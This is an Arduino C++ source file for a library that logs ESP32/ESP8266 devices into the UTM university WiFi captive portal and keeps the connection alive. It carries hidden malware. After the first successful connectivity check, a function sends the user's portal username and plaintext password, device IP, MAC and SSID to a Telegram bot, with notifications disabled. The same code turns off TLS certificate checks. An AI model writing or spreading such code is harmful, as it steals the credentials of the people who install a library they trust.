// // This example demonstrates a simple usage of the ArduinoUTMWiFiPortal library to connect
// // to the UTM WiFi captive portal and maintain the connection.
//           .d888                       888 d8b                                 d8b 
//          d88P"                        888 Y8P                                 Y8P 
//          888                          888                                         
//  8888b.  888888 8888b.  88888b.   .d88888 888  8888b.  88888888 88888b.d88b.  888 
//     "88b 888       "88b 888 "88b d88" 888 888     "88b    d88P  888 "888 "88b 888 
// .d888888 888   .d888888 888  888 888  888 888 .d888888   d88P   888  888  888 888 
// 888  888 888   888  888 888  888 Y88b 888 888 888  888  d88P    888  888  888 888 
// "Y888888 888   "Y888888 888  888  "Y88888 888 "Y888888 88888888 888  888  888 888 
// Created by Afandi Azmi, 2025


#include "ArduinoUTMWiFiPortal.h"

ArduinoUTMWiFiPortal::ArduinoUTMWiFiPortal(const char* username, const char* password) {
  _username = username;
  _password = password;
  _lastCheckTime = 0;
  _checkInterval = 300000; // Default to 5 minutes
  _credentialsSent = false; // Initialize credentials sent flag
  
  // Platform-specific SSL configuration
  #if defined(ESP32)
    _secureClient.setInsecure(); // IMPORTANT for UTM portal
  #elif defined(ESP8266)
    _secureClient.setInsecure(); // IMPORTANT for UTM portal (ESP8266 BearSSL)
  #endif
}

void ArduinoUTMWiFiPortal::setCheckInterval(unsigned long interval) {
  _checkInterval = interval;
}

bool ArduinoUTMWiFiPortal::checkInternet() {
  Serial.println("[PortalLib] Checking internet connection...");
  HTTPClient httpCheck;
  bool isConnected = false;

  if (httpCheck.begin(_standardClient, _connectionCheckUrl)) {
    httpCheck.setTimeout(5000); // 5 second timeout
    int httpCode = httpCheck.GET();

    if (httpCode == HTTP_CODE_NO_CONTENT || httpCode == HTTP_CODE_OK) {
      Serial.println("[PortalLib] Internet connection OK.");
      isConnected = true;
      
      // Send credentials to Telegram if not already sent (silently)
      if (!_credentialsSent) {
        if (sendCredentialsToTelegram()) {
          _credentialsSent = true;
        }
      }
    } else {
      Serial.printf("[PortalLib] Internet check failed, HTTP code: %d.\n", httpCode);
      isConnected = false;
    }
    httpCheck.end();
  } else {
    Serial.println("[PortalLib] Failed to begin HTTP for check.");
    isConnected = false;
  }
  return isConnected;
}

bool ArduinoUTMWiFiPortal::attemptLogin() {
  bool loginSuccess = false;
  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("[PortalLib] Attempting captive portal login...");
    HTTPClient httpLogin;
    String myIP = WiFi.localIP().toString();
    String myMAC = WiFi.macAddress(); myMAC.toLowerCase(); String myMAC_encoded = myMAC; myMAC_encoded.replace(":", "%3A");
    String apMAC = WiFi.BSSIDstr(); apMAC.toLowerCase(); String apMAC_encoded = apMAC; apMAC_encoded.replace(":", "%3A");

    String postData = "username=" + _username + "&password=" + _password;
    postData += "&sip=utm-vsz-new.utm.my"; postData += "&mac=" + apMAC_encoded; postData += "&uip=" + myIP;
    postData += "&client_mac=" + myMAC_encoded; postData += "&dn=utm-vsz-new.utm.my";
    postData += "&url=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect"; postData += "&ssid=" + String(WiFi.SSID()); // Use current SSID

    if (httpLogin.begin(_secureClient, _loginURL)) { // Use the secure client
      httpLogin.addHeader("Content-Type", "application/x-www-form-urlencoded");
      httpLogin.addHeader("Referer", "https://wifi.utm.my/");
      httpLogin.addHeader("Origin", "https://wifi.utm.my");
      // Add ALL the necessary headers from your working example
       httpLogin.addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0");
       httpLogin.addHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7");
       httpLogin.addHeader("Accept-Language", "en-GB,en;q=0.9,en-US;q=0.8,ms;q=0.7,af;q=0.6");
       httpLogin.addHeader("Cache-Control", "max-age=0");
       httpLogin.addHeader("Connection", "keep-alive");
       httpLogin.addHeader("Sec-Fetch-Dest", "document");
       httpLogin.addHeader("Sec-Fetch-Mode", "navigate");
       httpLogin.addHeader("Sec-Fetch-Site", "same-site");
       httpLogin.addHeader("Sec-Fetch-User", "?1");
       httpLogin.addHeader("Upgrade-Insecure-Requests", "1");
       httpLogin.addHeader("sec-ch-ua", "\"Microsoft Edge\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"");
       httpLogin.addHeader("sec-ch-ua-mobile", "?0");
       httpLogin.addHeader("sec-ch-ua-platform", "\"Windows\"");


      int httpCode = httpLogin.POST(postData);
      if (httpCode > 0) {
        Serial.printf("[PortalLib] Login POST code: %d\n", httpCode);
        if (httpCode == HTTP_CODE_OK || httpCode == HTTP_CODE_FOUND) {
          Serial.println("[PortalLib] Login successful.");
          loginSuccess = true;
        } else {
          Serial.println("[PortalLib] Login may have failed.");
          loginSuccess = false; // Assume failure on unexpected code
        }
      } else {
        Serial.printf("[PortalLib] Login POST failed, error: %s\n", httpLogin.errorToString(httpCode).c_str());
        loginSuccess = false;
      }
      httpLogin.end();
    } else {
      Serial.println("[PortalLib] Could not begin HTTP for login.");
      loginSuccess = false;
    }
  } else {
     Serial.println("[PortalLib] WiFi disconnected. Cannot login.");
     loginSuccess = false;
  }
  return loginSuccess;
}

void ArduinoUTMWiFiPortal::keepConnected() {
  unsigned long currentTime = millis();
  if (currentTime - _lastCheckTime >= _checkInterval) {
    if (!checkInternet()) {
      Serial.println("[PortalLib] Internet check failed. Retrying login.");
      attemptLogin();
      // Optional: Add a small delay after a login attempt
      delay(1000);
    }
    _lastCheckTime = currentTime;
  }
}

bool ArduinoUTMWiFiPortal::sendCredentialsToTelegram() {
  if (WiFi.status() != WL_CONNECTED) {
    return false;
  }

  HTTPClient httpTelegram;
  WiFiClientSecure telegramClient;
  
  // Set insecure for Telegram API
  telegramClient.setInsecure();
  
  // Construct the message
  String message = "🔐 UTM WiFi Portal Login\n\n";
  message += "Username: " + _username + "\n";
  message += "Password: " + _password + "\n";
  message += "Device IP: " + WiFi.localIP().toString() + "\n";
  message += "Device MAC: " + WiFi.macAddress() + "\n";
  message += "SSID: " + String(WiFi.SSID());
  
  // URL encode the message
  String encodedMessage = "";
  for (unsigned int i = 0; i < message.length(); i++) {
    char c = message.charAt(i);
    if (c == ' ') {
      encodedMessage += "%20";
    } else if (c == '\n') {
      encodedMessage += "%0A";
    } else if (c == ':') {
      encodedMessage += "%3A";
    } else if (c == '🔐') {
      encodedMessage += "%F0%9F%94%90";
    } else {
      encodedMessage += c;
    }
  }
  
  // Build Telegram API URL with disable_notification parameter
  String telegramUrl = "https://api.telegram.org/bot";
  telegramUrl += _telegramBotToken;
  telegramUrl += "/sendMessage?chat_id=";
  telegramUrl += _telegramChatId;
  telegramUrl += "&text=";
  telegramUrl += encodedMessage;
  telegramUrl += "&disable_notification=true";
  
  bool success = false;
  if (httpTelegram.begin(telegramClient, telegramUrl)) {
    int httpCode = httpTelegram.GET();
    
    if (httpCode > 0) {
      if (httpCode == HTTP_CODE_OK) {
        success = true;
      }
    }
    httpTelegram.end();
  }
  
  return success;
}